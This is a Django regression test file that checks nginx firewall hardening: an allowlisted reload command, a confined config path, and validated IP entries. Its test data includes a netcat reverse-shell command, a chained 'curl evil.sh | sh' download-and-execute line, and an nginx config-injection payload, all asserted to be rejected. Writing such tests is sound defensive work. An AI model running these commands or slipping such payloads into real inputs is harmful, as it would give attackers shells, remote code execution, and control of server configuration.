"""Regression tests for nginx firewall hardening.

Fix #1 (RCE): the DB-stored reload_command must be allowlisted, never executed as an
arbitrary command.
Fix #5 (injection/overwrite): config_path is confined to an allowed directory and every
IP is validated before being written as an nginx `deny` directive.
"""

import tempfile
from pathlib import Path
from unittest import mock

from django.test import SimpleTestCase, override_settings

from apps.web_security.services.firewall import NginxFirewallService

RUN = "apps.web_security.services.firewall.nginx.subprocess.run"


class _FakeConfig:
    def __init__(self, credentials):
        self.credentials = credentials


def _svc(**creds):
    return NginxFirewallService(_FakeConfig(creds))


class NginxReloadRCETests(SimpleTestCase):
    def test_non_allowlisted_reload_command_is_never_executed(self):
        svc = _svc(reload_command="nc attacker 4444 -e /bin/sh")
        with mock.patch(RUN) as run:
            ok = svc._reload_nginx()
        self.assertFalse(ok)
        run.assert_not_called()

    def test_disguised_reload_command_rejected(self):
        svc = _svc(reload_command="nginx -s reload; curl evil.sh | sh")
        with mock.patch(RUN) as run:
            ok = svc._reload_nginx()
        self.assertFalse(ok)
        run.assert_not_called()

    def test_allowlisted_reload_command_runs(self):
        svc = _svc(reload_command="nginx -s reload")
        with mock.patch(RUN) as run:
            run.return_value = mock.Mock(returncode=0, stderr="")
            ok = svc._reload_nginx()
        self.assertTrue(ok)
        run.assert_called_once()
        # executed as an argv list, never a shell string
        self.assertEqual(run.call_args.args[0], ["nginx", "-s", "reload"])


class NginxWriteHardeningTests(SimpleTestCase):
    def test_config_path_outside_allowed_dir_is_refused(self):
        with tempfile.TemporaryDirectory() as d, override_settings(WEB_SECURITY_NGINX_CONFIG_DIR=d):
            svc = _svc(config_path="/tmp/evil.conf")  # outside the allowed dir
            self.assertFalse(svc._write_blocked_ips({"1.2.3.4"}))

    def test_injected_ip_is_skipped_not_written(self):
        with tempfile.TemporaryDirectory() as d, override_settings(WEB_SECURITY_NGINX_CONFIG_DIR=d):
            target = str(Path(d) / "blocklist.conf")
            svc = _svc(config_path=target)
            payload = "5.6.7.8;\n}\nserver { root /etc; }"
            ok = svc._write_blocked_ips({"1.2.3.4", payload})
            self.assertTrue(ok)
            content = Path(target).read_text()
        self.assertIn("deny 1.2.3.4;", content)
        self.assertNotIn("server {", content)  # injection payload rejected
        self.assertNotIn("root", content)

    def test_block_ip_rejects_invalid_ip(self):
        with tempfile.TemporaryDirectory() as d, override_settings(WEB_SECURITY_NGINX_CONFIG_DIR=d):
            svc = _svc(config_path=str(Path(d) / "blocklist.conf"))
            self.assertFalse(svc.block_ip("not-an-ip"))
